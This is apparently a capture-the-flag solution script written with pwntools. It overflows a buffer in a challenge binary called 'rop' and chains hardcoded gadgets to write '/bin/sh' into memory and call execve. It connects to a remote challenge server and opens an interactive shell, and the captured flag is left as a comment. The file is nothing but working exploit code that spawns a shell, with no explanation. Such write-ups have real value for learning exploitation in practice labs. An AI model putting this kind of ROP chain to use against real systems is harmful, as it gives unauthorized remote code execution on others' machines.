from pwn import *
poprdi=0x0000000000400686
poprsi=0x0000000000410093
poprdx=0x00000000004494b5
poprax=0x0000000000415294

sysc=0x0000000000474a65
mov=0x0000000000446c1b
bss=0x00000000006bb2e0
n=remote('isc.taiwan-te.ch',10004)
#n=process('./rop')
n.recvuntil(')\n')

p='a'*0x18+p64(poprdi)+p64(bss)+p64(poprsi)+'/bin/sh\x00'+p64(mov)+p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(sysc)


n.send(p)
n.interactive()

#FLAG{__r37urn_0r13n73d_pr0gr4mm1ng__}
